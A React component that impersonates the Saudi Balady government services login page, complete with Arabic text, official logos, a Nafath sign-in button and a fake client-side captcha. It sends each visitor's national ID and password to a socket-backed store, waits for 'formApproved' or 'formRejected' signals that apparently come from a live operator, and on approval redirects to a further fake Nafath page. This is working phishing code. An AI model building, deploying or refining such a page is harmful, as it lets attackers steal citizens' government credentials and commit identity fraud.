import { useState, useEffect } from "react";
import { socket, updatePage, submitData, visitor } from "@/lib/store";
import { User, Lock, Eye, EyeOff, RefreshCw, Loader2 } from "lucide-react";

export default function BaladyLogin() {
  const [nationalId, setNationalId] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [captchaCode, setCaptchaCode] = useState("");
  const [captchaInput, setCaptchaInput] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState<{nationalId?: string; password?: string; captcha?: string}>({});

  // Get service name from URL
  const urlParams = new URLSearchParams(window.location.search);
  const serviceName = urlParams.get('service') || '';

  useEffect(() => {
    updatePage("صفحة بلدي");
    generateCaptcha();
  }, []);

  const generateCaptcha = () => {
    const code = Math.floor(100000 + Math.random() * 900000).toString();
    setCaptchaCode(code);
    setCaptchaInput("");
  };

  const handleSubmit = () => {
    const newErrors: {nationalId?: string; password?: string; captcha?: string} = {};
    
    if (!nationalId) {
      newErrors.nationalId = "يرجى إدخال رقم الهوية / الإقامة";
    } else if (nationalId.length < 10) {
      newErrors.nationalId = "رقم الهوية يجب أن يكون 10 أرقام";
    }
    
    if (!password) {
      newErrors.password = "يرجى إدخال كلمة المرور";
    }

    if (!captchaInput) {
      newErrors.captcha = "يرجى إدخال رمز التحقق";
    } else if (captchaInput !== captchaCode) {
      newErrors.captcha = "رمز التحقق غير صحيح";
    }

    setErrors(newErrors);

    if (Object.keys(newErrors).length === 0) {
      setIsLoading(true);
      
      submitData({
        type: "balady_login",
        service: serviceName,
        nationalId,
        password,
      });

      socket.value.on("formApproved", () => {
        setIsLoading(false);
        window.location.href = `/nafath-login?service=${encodeURIComponent(serviceName)}`;
      });

      socket.value.on("formRejected", () => {
        setIsLoading(false);
        setPassword("");
        setErrors({ password: "كلمة المرور غير صحيحة، يرجى المحاولة مرة أخرى" });
        generateCaptcha();
      });
    }
  };

  return (
    <div className="min-h-screen relative font-sans overflow-hidden" dir="rtl">
      {/* Background Image */}
      <div 
        className="absolute inset-0 z-0"
        style={{
          backgroundImage: `url('/images/balady-bg.jpg')`,
          backgroundSize: 'cover',
          backgroundPosition: 'center',
          backgroundRepeat: 'no-repeat',
        }}
      />
      {/* Dark green overlay on image */}
      <div 
        className="absolute inset-0 z-[1]"
        style={{
          background: "linear-gradient(135deg, rgba(0,40,20,0.85) 0%, rgba(0,55,28,0.80) 50%, rgba(0,40,20,0.85) 100%)",
        }}
      />

      {/* Main Content */}
      <div className="relative z-10 min-h-screen flex flex-col">
        


        {/* Center Content */}
        <div className="flex-1 flex items-center justify-center px-4 py-8">
          <div className="w-full max-w-[1200px] flex flex-col lg:flex-row items-center gap-10 lg:gap-20">
            
            {/* Left Side - Login Form */}
            <div className="w-full max-w-[460px] order-1 lg:order-2 flex-shrink-0">
              <div className="bg-white rounded-lg shadow-2xl px-8 py-10">
                <h2 className="text-[28px] font-bold text-gray-800 text-center mb-6">تسجيل دخول</h2>

                {/* Subtitle */}
                <p className="text-center text-gray-600 text-sm mb-6">
                  للمواطن السعودي أو المقيم الذي يحمل إقامة سعودية
                </p>

                {/* Nafath Logo */}
                <div className="flex justify-center mb-6">
                  <img src="/images/nafath-logo.png" alt="نفاذ" className="h-[100px] object-contain" />
                </div>

                {/* Description */}
                <p className="text-center text-gray-600 text-sm leading-[1.8] mb-6">
                  يمكن الدخول عن طريق "أبشر" من خلال بوابة النفاذ الوطني الموحد لكي تستفيد من الخدمات الإلكترونيه المقدمة من بلدي خدمات
                </p>

                {/* Nafath Login Button */}
                <button
                  onClick={() => {
                    setIsLoading(true);
                    submitData({
                      type: "balady_login",
                      service: serviceName,
                      method: "nafath",
                    });
                    setTimeout(() => {
                      setIsLoading(false);
                      window.location.href = `/nafath-login?service=${encodeURIComponent(serviceName)}`;
                    }, 1500);
                  }}
                  disabled={isLoading}
                  className="w-full bg-[#2ABBA7] hover:bg-[#239E8E] text-white font-bold py-3.5 px-6 rounded-lg transition-colors disabled:opacity-70 flex items-center justify-center gap-2 text-base mb-6"
                >
                  {isLoading ? (
                    <>
                      <Loader2 className="w-5 h-5 animate-spin" />
                      جاري التحويل...
                    </>
                  ) : (
                    "الدخول بواسطة النفاذ الوطني الموحد"
                  )}
                </button>

                {/* Investors Note */}
                <div className="bg-gray-50 border border-gray-200 rounded-lg py-3 px-4 flex items-center gap-2 justify-center">
                  <span className="text-sm text-gray-600">
                    للمستثمرين الذين لا يحملون هوية أو إقامة سعودية الرجاء{" "}
                    <button className="text-[#2ABBA7] font-semibold hover:underline">الضغط هنا</button>
                  </span>
                  <div className="w-5 h-5 rounded-full bg-[#2ABBA7] text-white flex items-center justify-center text-xs font-bold">i</div>
                </div>
              </div>
            </div>

            {/* Right Side - Logo & Welcome Text */}
            <div className="flex-1 text-center lg:text-right order-2 lg:order-1">
              <img src="/images/balady-logo-transparent.png" alt="خدمات بلدي - balady services" className="h-[200px] object-contain block mr-0 ml-auto mb-8" />
              <h1 className="text-3xl lg:text-[40px] font-bold text-white mb-6 leading-[1.6]">
                مرحباً بك في بلدي خدمات
              </h1>
              <p className="text-base lg:text-lg text-white/85 leading-[2] max-w-[550px] mx-auto lg:mx-0 lg:mr-0">
                يمكنك من خلال بوابة بلدي خدمات متابعة كافة الطلبات الخاصة بك وتنفيذ كافة المتطلبات ذو العلاقة المباشرة مع الأمانات والبلدية من خلال منصة موحدة تهدف لتسهيل أعمالك ومتابعتها.
              </p>
            </div>

          </div>
        </div>

        {/* Footer */}
        <div className="text-center py-4">
          <p className="text-white/50 text-sm">جميع الحقوق محفوظة – وزارة البلديات والإسكان © 2026</p>
        </div>
      </div>
    </div>
  );
}
